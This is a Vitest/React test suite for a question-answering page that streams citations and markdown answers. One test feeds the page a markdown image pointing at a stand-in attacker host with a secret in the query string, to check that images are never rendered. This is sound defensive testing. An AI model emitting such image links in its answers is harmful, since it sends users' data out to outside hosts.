import { render, screen, waitFor, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { createMemoryRouter, RouterProvider } from "react-router";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { NOT_FOUND_ANSWER } from "@/constants";
import { loginRedirect } from "@/lib/apiClient";
import { getToken, setToken } from "@/lib/auth";
import { routes } from "@/routes";
import type { Citation } from "@/types/api";

const future = new Date(Date.now() + 60_000).toISOString();
const fetchMock = vi.fn<typeof fetch>();

function citation(n: number, overrides: Partial<Citation> = {}): Citation {
  return {
    n,
    itemId: `item-${n}`,
    type: "NOTE",
    title: `Note ${n}`,
    sourceUrl: null,
    snippet: `snippet ${n}`,
    similarity: 0.8,
    ...overrides,
  };
}

function sse(event: string, data: unknown) {
  return `event: ${event}\ndata: ${JSON.stringify(data)}\n\n`;
}

function streamResponse(chunks: string[], { close = true } = {}) {
  const encoder = new TextEncoder();
  const body = new ReadableStream<Uint8Array>({
    start(controller) {
      for (const chunk of chunks) controller.enqueue(encoder.encode(chunk));
      if (close) controller.close();
    },
  });
  return new Response(body, { status: 200, headers: { "Content-Type": "text/event-stream" } });
}

function renderAsk() {
  const router = createMemoryRouter(routes, { initialEntries: ["/"] });
  render(<RouterProvider router={router} />);
}

async function ask(question: string) {
  await userEvent.type(screen.getByRole("textbox", { name: "Question" }), `${question}{Enter}`);
}

beforeEach(() => {
  setToken("tok", future);
  vi.stubGlobal("fetch", fetchMock);
  vi.spyOn(loginRedirect, "go").mockImplementation(() => {});
});

afterEach(() => {
  localStorage.clear();
  fetchMock.mockReset();
  vi.unstubAllGlobals();
  vi.restoreAllMocks();
});

describe("AskPage", () => {
  it("starts with a centered question box", () => {
    renderAsk();
    expect(screen.getByRole("heading", { name: "What do you want to know?" })).toBeInTheDocument();
    expect(screen.getByRole("button", { name: "Ask" })).toBeDisabled();
  });

  it("posts the question with the token and streams citations and a markdown answer", async () => {
    fetchMock.mockResolvedValue(
      streamResponse([
        sse("citations", [
          citation(1),
          citation(2, { type: "URL", title: "Page", sourceUrl: "https://example.com/p" }),
        ]),
        sse("token", { text: "Cats **sleep** a lot [1" }),
        sse("token", { text: "]. Dogs bark [2]." }),
        sse("done", {}),
      ]),
    );
    renderAsk();
    await ask("  do cats sleep?  ");

    expect(await screen.findByRole("heading", { name: "do cats sleep?" })).toBeInTheDocument();
    const [url, init] = fetchMock.mock.calls[0] ?? [];
    expect(url).toBe("http://localhost:3000/query");
    expect(init?.method).toBe("POST");
    expect(JSON.parse(String(init?.body))).toEqual({ query: "do cats sleep?" });
    expect(new Headers(init?.headers).get("Authorization")).toBe("Bearer tok");

    const sources = screen.getByRole("region", { name: "Sources" });
    const cards = within(sources).getAllByRole("listitem");
    expect(cards).toHaveLength(2);
    expect(within(cards[0] as HTMLElement).getByText("Note 1")).toBeInTheDocument();
    expect(within(cards[0] as HTMLElement).getByText("snippet 1")).toBeInTheDocument();
    expect(within(cards[0] as HTMLElement).getByText("80% match")).toBeInTheDocument();
    expect(within(cards[1] as HTMLElement).getByRole("link")).toHaveAttribute(
      "href",
      "https://example.com/p",
    );

    const answer = await screen.findByTestId("answer");
    await waitFor(() => expect(answer).toHaveTextContent("Dogs bark"));
    expect(within(answer).getByText("sleep").tagName).toBe("STRONG");
    expect(within(answer).getByRole("button", { name: "Citation 1" })).toBeInTheDocument();
    expect(within(answer).getByRole("button", { name: "Citation 2" })).toBeInTheDocument();
    expect(screen.queryByRole("status")).not.toBeInTheDocument();
  });

  it("shows citation cards before any token arrives", async () => {
    fetchMock.mockResolvedValue(
      streamResponse([sse("citations", [citation(1)])], { close: false }),
    );
    renderAsk();
    await ask("q");
    expect(await screen.findByText("Note 1")).toBeInTheDocument();
    expect(screen.getByRole("status")).toHaveTextContent("Writing the answer...");
  });

  it("scrolls to and highlights the card when a citation chip is clicked", async () => {
    const scrollIntoView = vi.fn();
    Element.prototype.scrollIntoView = scrollIntoView;
    fetchMock.mockResolvedValue(
      streamResponse([
        sse("citations", [citation(1), citation(2)]),
        sse("token", { text: "Fact [2]." }),
        sse("done", {}),
      ]),
    );
    renderAsk();
    await ask("q");
    await userEvent.click(await screen.findByRole("button", { name: "Citation 2" }));

    const card = document.getElementById("citation-2");
    expect(scrollIntoView).toHaveBeenCalledOnce();
    expect(scrollIntoView.mock.contexts[0]).toBe(card);
    expect(card?.querySelector("[data-active]")).not.toBeNull();
    expect(document.getElementById("citation-1")?.querySelector("[data-active]")).toBeNull();
  });

  it("shows the not-found answer as a muted message with no cards", async () => {
    fetchMock.mockResolvedValue(
      streamResponse([
        sse("citations", []),
        sse("token", { text: NOT_FOUND_ANSWER }),
        sse("done", {}),
      ]),
    );
    renderAsk();
    await ask("unknown");
    const message = await screen.findByText(NOT_FOUND_ANSWER);
    expect(message).toHaveClass("text-muted-foreground");
    expect(screen.queryByRole("region", { name: "Sources" })).not.toBeInTheDocument();
  });

  it("shows a searching state before the citations arrive", async () => {
    fetchMock.mockResolvedValue(streamResponse([], { close: false }));
    renderAsk();
    await ask("q");
    expect(await screen.findByRole("status")).toHaveTextContent("Searching your saved items...");
  });

  it("hides the sources when the LLM itself replies not found", async () => {
    fetchMock.mockResolvedValue(
      streamResponse([
        sse("citations", [citation(1)]),
        sse("token", { text: NOT_FOUND_ANSWER }),
        sse("done", {}),
      ]),
    );
    renderAsk();
    await ask("q");
    expect(await screen.findByText(NOT_FOUND_ANSWER)).toHaveClass("text-muted-foreground");
    expect(screen.queryByRole("region", { name: "Sources" })).not.toBeInTheDocument();
  });

  it("never renders images from the answer", async () => {
    fetchMock.mockResolvedValue(
      streamResponse([
        sse("citations", [citation(1)]),
        sse("token", { text: "Text ![x](https://evil.example/?d=secret) [1]" }),
        sse("done", {}),
      ]),
    );
    renderAsk();
    await ask("q");
    const answer = await screen.findByTestId("answer");
    await waitFor(() => expect(within(answer).getByRole("button", { name: "Citation 1" })));
    expect(answer.querySelector("img")).toBeNull();
  });

  it("does not turn [n] inside code into a chip", async () => {
    fetchMock.mockResolvedValue(
      streamResponse([
        sse("citations", [citation(1)]),
        sse("token", { text: "Use `arr[1]` here [1]." }),
        sse("done", {}),
      ]),
    );
    renderAsk();
    await ask("q");
    const answer = await screen.findByTestId("answer");
    await waitFor(() => expect(within(answer).getByText("arr[1]").tagName).toBe("CODE"));
    expect(within(answer).getAllByRole("button")).toHaveLength(1);
  });

  it("shows an invalid response message for bad event data", async () => {
    fetchMock.mockResolvedValue(streamResponse(["event: citations\ndata: {oops\n\n"]));
    renderAsk();
    await ask("q");
    expect(await screen.findByRole("alert")).toHaveTextContent("Invalid response from the server");
  });

  it("shows the stream error message and keeps the partial answer", async () => {
    fetchMock.mockResolvedValue(
      streamResponse([
        sse("citations", [citation(1)]),
        sse("token", { text: "Partial" }),
        sse("error", { message: "Could not answer the question. Try again." }),
      ]),
    );
    renderAsk();
    await ask("q");
    expect(await screen.findByRole("alert")).toHaveTextContent(
      "Could not answer the question. Try again.",
    );
    expect(screen.getByTestId("answer")).toHaveTextContent("Partial");
  });

  it("shows an error when the stream ends without done", async () => {
    fetchMock.mockResolvedValue(streamResponse([sse("citations", [])]));
    renderAsk();
    await ask("q");
    expect(await screen.findByRole("alert")).toHaveTextContent("The answer stopped early");
  });

  it("shows the 400 validation message", async () => {
    fetchMock.mockResolvedValue(
      new Response(
        JSON.stringify({ error: { code: "VALIDATION_ERROR", message: "Query is empty" } }),
        {
          status: 400,
        },
      ),
    );
    renderAsk();
    await ask("q");
    expect(await screen.findByRole("alert")).toHaveTextContent("Query is empty");
  });

  it("shows a network error", async () => {
    fetchMock.mockRejectedValue(new TypeError("Failed to fetch"));
    renderAsk();
    await ask("q");
    expect(await screen.findByRole("alert")).toHaveTextContent(
      "Could not reach the server. Try again.",
    );
  });

  it("goes to /login on a 401", async () => {
    fetchMock.mockResolvedValue(
      new Response(JSON.stringify({ error: { code: "UNAUTHORIZED", message: "Login required" } }), {
        status: 401,
      }),
    );
    renderAsk();
    await ask("q");
    await waitFor(() => expect(loginRedirect.go).toHaveBeenCalledOnce());
    expect(getToken()).toBeNull();
  });

  it("cancels the old question and replaces its answer when a new one is asked", async () => {
    fetchMock
      .mockResolvedValueOnce(
        streamResponse([sse("citations", [citation(1, { title: "Old source" })])], {
          close: false,
        }),
      )
      .mockResolvedValueOnce(
        streamResponse([
          sse("citations", [citation(1, { title: "New source" })]),
          sse("token", { text: "New answer" }),
          sse("done", {}),
        ]),
      );
    renderAsk();
    await ask("first");
    expect(await screen.findByText("Old source")).toBeInTheDocument();
    const firstSignal = fetchMock.mock.calls[0]?.[1]?.signal;

    await ask("second");
    expect(await screen.findByText("New answer")).toBeInTheDocument();
    expect(firstSignal?.aborted).toBe(true);
    expect(screen.getByRole("heading", { name: "second" })).toBeInTheDocument();
    expect(screen.queryByText("Old source")).not.toBeInTheDocument();
  });

  it("does not send a question longer than 1000 chars", async () => {
    renderAsk();
    const box = screen.getByRole("textbox", { name: "Question" });
    expect(box).toHaveAttribute("maxLength", "1000");
  });
});
